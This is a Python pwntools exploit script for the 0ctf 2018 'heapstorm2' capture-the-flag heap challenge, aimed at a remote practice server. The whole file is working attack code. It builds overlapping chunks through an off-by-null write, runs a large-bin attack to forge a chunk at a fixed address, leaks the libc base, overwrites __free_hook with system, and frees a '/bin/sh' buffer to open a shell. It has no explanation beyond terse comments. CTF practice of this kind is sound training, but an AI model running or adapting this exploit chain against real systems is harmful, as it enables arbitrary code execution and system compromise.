from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('0ctf_2018_heapstorm2')
io = remote('node4.buuoj.cn', 28615)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('libc-2.23.so')
elf = ELF('0ctf_2018_heapstorm2')
heap_array = 0x13370800
fake_chunk = heap_array - 0x20

def add(size):
    io.sendlineafter('Command: ', '1')
    io.sendlineafter('Size: ', str(size))


def edit(index, size, content):
    io.sendlineafter('Command: ', '2')
    io.sendlineafter('Index: ', str(index))
    io.sendlineafter('Size: ', str(size))
    io.sendafter('Content: ', content)


def delete(index):
    io.sendlineafter('Command: ', '3')
    io.sendlineafter('Index: ', str(index))


def show(index):
    io.sendlineafter('Command: ', '4')
    io.sendlineafter('Index: ', str(index))


def overlap():
    add(0x18)                               # chunk0 index0
    add(0x508)                              # chunk1 index1
    add(0x18)                               # chunk2 index2
    payload = b'\x01' * 0x4f0 + p64(0x500)
    edit(1, 0x4f8, payload)

    add(0x18)                               # chunk3 index3
    add(0x508)                              # chunk4 index4
    add(0x18)                               # chunk5 index5
    payload = b'\x04' * 0x4f0 + p64(0x500)
    edit(4, 0x4f8, payload)

    add(0x18)                               # chunk6 index6

    delete(1)
    payload = b'\x00' * 12
    edit(0, 12, payload)
    add(0x18)                               # chunk1_0 index1
    add(0x4d8)                              # chunk1_1 index7 (overlap)
    delete(1)
    delete(2)
    add(0x38)                               # chunk1_0 index1
    add(0x4e8)                              # chunk1_1+chunk2 index2
    
    delete(4)
    payload = b'\x03' * 12
    edit(3, 12, payload)
    add(0x18)                               # chunk4_0 index4
    add(0x4d8)                              # chunk4_1 index8 (overlap)
    delete(4)
    delete(5)
    add(0x48)                               # chunk4_0 index4

    delete(2)
    add(0x4e8)                              # chunk1_1+chunk2 index2
    delete(2)

    payload = p64(0) * 2 + p64(0) + p64(0x4f1) 
    payload += p64(0) + p64(fake_chunk)
    edit(7, 0x30, payload)

    payload = p64(0) * 4 + p64(0) + p64(0x4e1) 
    payload += p64(0) + p64(fake_chunk + 8)         # fake bck, make sure bck->fd is a writeable address
    payload += p64(0) + p64(fake_chunk - 0x18 - 5)  # fake bk_nextsize, write 0x56 in fake_chunk->size
    edit(8, 0x50, payload)
    add(0x48)                               # fake_chunk index2
    io.recvline()


def pwn():
    payload = p64(0) * 5 + p64(0x13377331) + p64(heap_array + 0x20)
    edit(2, 0x38, payload)
    payload = p64(heap_array + 0x20) + p64(0x100) + p64(fake_chunk + 0x18) + p64(0x100) + p64(0) * 2
    edit(0, 0x30, payload)
    add(0x4e8)                              # index2  
    show(1)
    libc_base = u64(io.recvuntil(b'\x7f\x00\x00')[-8:]) - libc.sym['__malloc_hook'] - 0x68
    log.success('libc_base: ' + hex(libc_base))   
    __free_hook = libc_base + libc.sym['__free_hook']
    system = libc_base + libc.sym['system']
    edit(0, 8, p64(__free_hook - 8))   
    edit(0, 0x10, b'/bin/sh\x00' + p64(system))   
    delete(0)
    io.interactive()    
    # gdb.attach(io)
    # pause()


if __name__ == '__main__':
    while True:
        try:
            overlap()
        except EOFError:
            io.close()
            # io = process('0ctf_2018_heapstorm2')
            io = remote('node4.buuoj.cn', 28615)
        else:
            break
    pwn()
